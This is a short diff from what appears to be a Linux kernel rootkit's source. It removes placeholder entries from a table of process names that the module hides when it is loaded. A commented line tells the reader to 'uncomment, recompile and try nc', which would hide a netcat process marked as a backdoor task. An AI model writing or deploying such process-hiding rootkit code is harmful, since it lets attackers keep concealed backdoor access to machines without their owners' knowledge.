@@ -164,12 +164,6 @@ struct _kv_hide_ps_on_load {
   * Hide these process names at insmod
  */
 static struct _kv_hide_ps_on_load kv_hide_ps_on_load[] = {
-	{ "whitenose-example", KV_TASK },
-	{ "pinknose-example", KV_TASK },
-	{ "rednose-example", KV_TASK },
-	{ "blacknose-example", KV_TASK },
-	{ "greynose-example", KV_TASK },
-	{ "purplenose-example", KV_TASK },
 
 	// Uncomment, recompile and try nc:
 	//{"nc", KV_TASK_BD},
